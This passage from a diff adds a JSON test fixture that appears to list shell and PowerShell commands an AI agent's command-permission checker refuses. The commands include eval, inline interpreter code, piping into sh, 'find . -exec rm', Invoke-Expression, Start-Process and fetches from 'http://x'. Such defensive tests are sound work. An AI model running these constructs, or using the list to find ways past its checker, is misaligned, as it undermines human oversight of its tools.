+  "kind": "refused",
+  "construct": "(xargs)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(eval)",
+  "tool": "Bash",
+  "command": "eval ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(eval)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(exec)",
+  "tool": "Bash",
+  "command": "exec ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(exec)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(source)",
+  "tool": "Bash",
+  "command": "source f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(source)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(.)",
+  "tool": "Bash",
+  "command": ". f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(.)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(watch)",
+  "tool": "Bash",
+  "command": "watch ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(watch)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(stdbuf)",
+  "tool": "Bash",
+  "command": "stdbuf -o0 ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(stdbuf)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wrapper with options (env -u)",
+  "tool": "Bash",
+  "command": "env -u X ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wrapper with options (env -u)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wrapper with options (env -C)",
+  "tool": "Bash",
+  "command": "env -C d ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wrapper with options (env -C)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wrapper with options (command -v)",
+  "tool": "Bash",
+  "command": "command -v ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wrapper with options (command -v)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wrapper with options (nohup -x)",
+  "tool": "Bash",
+  "command": "nohup -x ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wrapper with options (nohup -x)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sh is only parseable",
+  "tool": "Bash",
+  "command": "echo x | sh",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sh is only parseable"
+ },
+ {
+  "source": "gen-p0",
+  "id": "bash is only parseable",
+  "tool": "Bash",
+  "command": "echo x | bash",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "bash is only parseable"
+ },
+ {
+  "source": "gen-p0",
+  "id": "bash is only parseable",
+  "tool": "Bash",
+  "command": "bash -lc 'ls'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "bash is only parseable"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sh is only parseable",
+  "tool": "Bash",
+  "command": "sh file.sh",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sh is only parseable"
+ },
+ {
+  "source": "gen-p0",
+  "id": "inline code (node -e",
+  "tool": "Bash",
+  "command": "node -e 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "inline code (node -e"
+ },
+ {
+  "source": "gen-p0",
+  "id": "inline code (node --eval",
+  "tool": "Bash",
+  "command": "node --eval 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "inline code (node --eval"
+ },
+ {
+  "source": "gen-p0",
+  "id": "inline code (python -c",
+  "tool": "Bash",
+  "command": "python -c 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "inline code (python -c"
+ },
+ {
+  "source": "gen-p0",
+  "id": "inline code (perl -e",
+  "tool": "Bash",
+  "command": "perl -e 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "inline code (perl -e"
+ },
+ {
+  "source": "gen-p0",
+  "id": "inline code (ruby -e",
+  "tool": "Bash",
+  "command": "ruby -e 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "inline code (ruby -e"
+ },
+ {
+  "source": "gen-p0",
+  "id": "inline code (php -r",
+  "tool": "Bash",
+  "command": "php -r 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "inline code (php -r"
+ },
+ {
+  "source": "gen-p0",
+  "id": "find -exec",
+  "tool": "Bash",
+  "command": "find . -exec rm {} ;",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "find -exec"
+ },
+ {
+  "source": "gen-p0",
+  "id": "awk -i",
+  "tool": "Bash",
+  "command": "awk -i inplace 'x' f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "awk -i"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sed w",
+  "tool": "Bash",
+  "command": "sed -n 'w out' f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sed w"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sed w",
+  "tool": "Bash",
+  "command": "sed -e 's/a/b/w out' f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sed w"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sed e",
+  "tool": "Bash",
+  "command": "sed 's/a/b/e' f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sed e"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sed -f",
+  "tool": "Bash",
+  "command": "sed -f s.sed f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sed -f"
+ },
+ {
+  "source": "gen-p0",
+  "id": "sed -f",
+  "tool": "Bash",
+  "command": "sed --file=s.sed f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "sed -f"
+ },
+ {
+  "source": "gen-p0",
+  "id": "git alias or external subcommand (st)",
+  "tool": "Bash",
+  "command": "git st",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "git alias or external subcommand (st)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "git alias",
+  "tool": "Bash",
+  "command": "git lg",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "git alias"
+ },
+ {
+  "source": "gen-p0",
+  "id": "gh alias or extension command (co)",
+  "tool": "Bash",
+  "command": "gh co 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "gh alias or extension command (co)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "gh alias",
+  "tool": "Bash",
+  "command": "gh alias set x y",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "gh alias"
+ },
+ {
+  "source": "gen-p0",
+  "id": "gh extension",
+  "tool": "Bash",
+  "command": "gh extension list",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "gh extension"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(powershell)",
+  "tool": "Bash",
+  "command": "powershell -c ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(powershell)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(pwsh)",
+  "tool": "Bash",
+  "command": "pwsh -c ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(pwsh)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(cmd)",
+  "tool": "Bash",
+  "command": "cmd /c dir",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(cmd)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "Set-Content $x -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt $x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "git $x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "gh pr $x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "$x | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "Set-Content $env:TEMP -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt $env:TEMP",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "git $env:TEMP feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "gh pr $env:TEMP 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "$env:TEMP | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "Set-Content @a -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt @a",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "git @a feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "gh pr @a 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "@a | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "Set-Content @{a=1} -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt @{a=1}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "git @{a=1} feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "gh pr @{a=1} 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "@ (splat",
+  "tool": "PowerShell",
+  "command": "@{a=1} | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "@ (splat"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "PowerShell",
+  "command": "Set-Content (gi x) -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt (gi x)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "PowerShell",
+  "command": "git (gi x) feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "PowerShell",
+  "command": "gh pr (gi x) 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "PowerShell",
+  "command": "(gi x) | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "Set-Content $(gi x) -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt $(gi x)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "git $(gi x) feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "gh pr $(gi x) 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "PowerShell",
+  "command": "$(gi x) | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "Set-Content { ls } -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt { ls }",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "git { ls } feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "gh pr { ls } 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "{ ls } | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "provider path (::)",
+  "tool": "PowerShell",
+  "command": "Set-Content FileSystem::C:/x -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "provider path (::)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "provider path (::)",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt FileSystem::C:/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "provider path (::)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "provider path (::)",
+  "tool": "PowerShell",
+  "command": "git FileSystem::C:/x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "provider path (::)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "provider path (::)",
+  "tool": "PowerShell",
+  "command": "gh pr FileSystem::C:/x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "provider path (::)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "provider path (::)",
+  "tool": "PowerShell",
+  "command": "FileSystem::C:/x | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "provider path (::)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "drive-relative path",
+  "tool": "PowerShell",
+  "command": "Set-Content C:foo -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "drive-relative path"
+ },
+ {
+  "source": "gen-p0",
+  "id": "drive-relative path",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt C:foo",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "drive-relative path"
+ },
+ {
+  "source": "gen-p0",
+  "id": "drive-relative path",
+  "tool": "PowerShell",
+  "command": "git C:foo feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "drive-relative path"
+ },
+ {
+  "source": "gen-p0",
+  "id": "drive-relative path",
+  "tool": "PowerShell",
+  "command": "gh pr C:foo 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "drive-relative path"
+ },
+ {
+  "source": "gen-p0",
+  "id": "drive-relative path",
+  "tool": "PowerShell",
+  "command": "C:foo | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "drive-relative path"
+ },
+ {
+  "source": "gen-p0",
+  "id": "[ ] (type literal",
+  "tool": "PowerShell",
+  "command": "Set-Content [int]::x -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "[ ] (type literal"
+ },
+ {
+  "source": "gen-p0",
+  "id": "[ ] (type literal",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt [int]::x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "[ ] (type literal"
+ },
+ {
+  "source": "gen-p0",
+  "id": "[ ] (type literal",
+  "tool": "PowerShell",
+  "command": "git [int]::x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "[ ] (type literal"
+ },
+ {
+  "source": "gen-p0",
+  "id": "[ ] (type literal",
+  "tool": "PowerShell",
+  "command": "gh pr [int]::x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "[ ] (type literal"
+ },
+ {
+  "source": "gen-p0",
+  "id": "[ ] (type literal",
+  "tool": "PowerShell",
+  "command": "[int]::x | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "[ ] (type literal"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "Set-Content a*b -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt a*b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "git a*b feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "gh pr a*b 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "a*b | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "Set-Content a?b -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt a?b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "git a?b feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "gh pr a?b 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wildcard",
+  "tool": "PowerShell",
+  "command": "a?b | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wildcard"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "PowerShell",
+  "command": "Set-Content `n -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt `n",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "PowerShell",
+  "command": "git `n feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "PowerShell",
+  "command": "gh pr `n 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "PowerShell",
+  "command": "`n | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "PowerShell",
+  "command": "Set-Content ~/x -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt ~/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "PowerShell",
+  "command": "git ~/x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "PowerShell",
+  "command": "gh pr ~/x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "PowerShell",
+  "command": "~/x | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "PowerShell",
+  "command": "Set-Content #c -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt #c",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "PowerShell",
+  "command": "git #c feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "PowerShell",
+  "command": "gh pr #c 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "PowerShell",
+  "command": "#c | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "Set-Content \"$x\" -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt \"$x\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "git \"$x\" feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "gh pr \"$x\" 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "\"$x\" | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "Set-Content \"a`nb\" -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt \"a`nb\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "git \"a`nb\" feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "gh pr \"a`nb\" 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside a PowerShell double-quoted",
+  "tool": "PowerShell",
+  "command": "\"a`nb\" | Out-Null",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside a PowerShell double-quoted"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (Invoke-Expression)",
+  "tool": "PowerShell",
+  "command": "Invoke-Expression 'ls'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (Invoke-Expression)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (iex)",
+  "tool": "PowerShell",
+  "command": "iex 'ls'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (iex)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "Invoke-Command { ls }",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (Start-Process)",
+  "tool": "PowerShell",
+  "command": "Start-Process ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (Start-Process)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (saps)",
+  "tool": "PowerShell",
+  "command": "saps ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (saps)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (powershell)",
+  "tool": "PowerShell",
+  "command": "powershell -c ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (powershell)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (pwsh)",
+  "tool": "PowerShell",
+  "command": "pwsh -c ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (pwsh)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (iwr)",
+  "tool": "PowerShell",
+  "command": "iwr http://x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (iwr)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (curl)",
+  "tool": "PowerShell",
+  "command": "curl http://x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (curl)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (Add-Type)",
+  "tool": "PowerShell",
+  "command": "Add-Type -Path x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (Add-Type)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (New-Object)",
+  "tool": "PowerShell",
+  "command": "New-Object X",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (New-Object)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (Import-Module)",
+  "tool": "PowerShell",
+  "command": "Import-Module m",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (Import-Module)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "code-running or unknown command (Set-Alias)",
+  "tool": "PowerShell",
+  "command": "Set-Alias a b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "code-running or unknown command (Set-Alias)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "ForEach-Object { ls }",
